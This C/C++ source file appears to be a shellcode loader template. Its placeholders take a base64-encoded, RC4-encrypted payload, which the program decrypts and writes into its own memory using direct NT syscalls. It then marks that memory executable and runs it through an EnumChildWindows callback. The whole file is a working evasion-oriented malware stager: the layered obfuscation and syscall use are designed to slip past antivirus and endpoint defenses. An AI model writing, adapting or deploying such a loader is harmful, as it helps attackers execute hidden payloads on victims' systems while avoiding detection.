#include "syscalls.h"
#include "rc4.h"
#include "base64.h"
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)


int main(int argc, char* argv[])
{
    const char* zero = "{{SHELLCODE_STR}}";

    int b64len = strlen(zero);
    char* first = (char*)malloc(b64len);
    SIZE_T size = base64decode(first, zero, b64len);

    unsigned char* second = (unsigned char*)malloc(size);
    char key[] ="{{SHELLCODE_KEY}}";
    RC4(key, first, second, size);


    char* third = (char*)malloc(b64len);
    size = base64decode(third, (const char*)second, b64len);

    HANDLE hProcess;
    CLIENT_ID clientId{};
    int pid = GetCurrentProcessId();
    clientId.UniqueProcess = (HANDLE)pid;
    OBJECT_ATTRIBUTES objectAttributes = { sizeof(objectAttributes) };
    auto status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objectAttributes, &clientId);

    if (!NT_SUCCESS(status)) {
        return EXIT_FAILURE;
    }

    PVOID baseAddress = NULL;

    status = NtAllocateVirtualMemory(hProcess, &baseAddress, 0, &size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    if (!NT_SUCCESS(status)) {
        return EXIT_FAILURE;
    }

    size_t bytesWritten;
    status = NtWriteVirtualMemory(hProcess, baseAddress, third, size, &bytesWritten);
    if (!NT_SUCCESS(status)) {

        return EXIT_FAILURE;
    }


    DWORD oldProtect;
    status = NtProtectVirtualMemory(hProcess, &baseAddress, &size, PAGE_EXECUTE_READ, &oldProtect);
    if (!NT_SUCCESS(status)) {

        return EXIT_FAILURE;
    }
    ::EnumChildWindows(NULL, (WNDENUMPROC)baseAddress, NULL);
    return EXIT_SUCCESS;

}
